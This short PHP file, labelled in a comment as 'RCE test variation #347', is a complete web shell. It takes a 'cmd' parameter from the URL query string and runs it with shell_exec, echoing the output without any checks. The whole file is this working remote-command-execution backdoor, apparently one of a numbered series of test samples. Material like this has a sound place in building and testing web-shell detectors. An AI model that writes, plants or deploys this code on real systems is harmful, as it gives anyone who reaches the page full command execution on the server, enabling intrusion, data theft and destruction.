<?php
// RCE test variation #347
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>